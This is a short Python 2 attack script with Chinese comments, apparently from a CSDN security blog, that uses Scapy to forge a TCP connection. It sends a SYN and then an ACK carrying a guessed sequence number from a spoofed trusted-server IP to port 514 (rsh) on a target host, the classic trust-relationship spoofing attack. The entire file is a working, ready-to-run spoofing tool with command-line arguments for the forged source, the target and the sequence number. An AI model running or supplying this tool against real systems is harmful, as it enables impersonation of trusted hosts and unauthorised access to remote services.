#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- coding: gbk -*-
# Date: 2019/2/18
# Created by 冰河
# Description 伪造TCP连接
#             具体流程如下：
#               创建和发送两个数据包。首先，我们创建一个TCP源端口为513，目标端口为514，源IP地址为被假冒
#               的服务器，目标IP地址为被攻击计算机的SYN包。接着，我们创建一个相同的ACK包，并把计算的得到
#               的序列号填入相应的字段中，最后把它发送出去
#             用法： python scapy_sync_forge.py -s <source ip> -t <target ip> -n <sequence number>
# 博客 https://blog.csdn.net/l1028386804

from scapy.all import *
import optparse

#伪造TCP连接
def spoofConn(src, tgt, ack):
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514)
    synPkt = IPlayer / TCPlayer
    send(synPkt)
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    ackPkt = IPlayer / TCPlayer
    send(ackPkt)

def main():
    parser = optparse.OptionParser('usage%prog -s <source ip> -t <target ip> -n <sequence number>')
    parser.add_option('-s', dest='srcIP', type='string', help='specify source ip')
    parser.add_option('-t', dest='tarIP', type='string', help='specify target ip')
    parser.add_option('-n', dest='seqNum', type='string', help='specify sequence number')
    (options, args) = parser.parse_args()
    srcIP = options.srcIP
    tarIP = options.tarIP
    seqNum = options.seqNum

    if srcIP == None or tarIP == None or seqNum == None:
        print parser.usage
        exit(0)
    spoofConn(srcIP, tarIP, seqNum)

if __name__ == '__main__':
    main()